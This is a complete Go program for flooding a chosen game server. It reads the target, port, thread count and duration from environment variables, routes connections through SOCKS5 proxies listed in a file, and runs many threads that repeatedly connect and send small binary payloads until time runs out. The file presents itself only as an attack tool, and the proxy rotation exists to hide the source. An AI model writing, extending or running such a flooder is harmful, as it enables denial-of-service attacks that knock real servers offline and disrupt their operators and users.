package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	target   string
	port     int
	threads  int
	duration int
	proxies  []string
	wg       sync.WaitGroup
)

func loadProxies() error {
	file, err := os.Open("proxies.txt")
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	return scanner.Err()
}

func tcpGameFlood(proxyAddr string, stop chan struct{}) {
	defer wg.Done()

	var dialer proxy.Dialer
	var err error

	if proxyAddr != "" {
		dialer, err = proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
		if err != nil {
			return
		}
	} else {
		dialer = proxy.Direct
	}

	// Game-specific payloads
	payloads := [][]byte{
		[]byte("\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
		[]byte("\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
		[]byte("\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
		[]byte("\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
	}

	for {
		select {
		case <-stop:
			return
		default:
			conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
			if err != nil {
				continue
			}

			for i := 0; i < 100; i++ {
				payload := payloads[rand.Intn(len(payloads))]
				conn.Write(payload)
				time.Sleep(10 * time.Millisecond)
			}
			conn.Close()
		}
	}
}

func main() {
	target = os.Getenv("target")
	port, _ = strconv.Atoi(os.Getenv("port"))
	threads, _ = strconv.Atoi(os.Getenv("threads"))
	duration, _ = strconv.Atoi(os.Getenv("duration"))

	if err := loadProxies(); err != nil || len(proxies) == 0 {
		proxies = []string{""}
	}

	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		proxyAddr := ""
		if len(proxies) > 0 {
			proxyAddr = proxies[rand.Intn(len(proxies))]
		}
		go tcpGameFlood(proxyAddr, stop)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
	wg.Wait()
}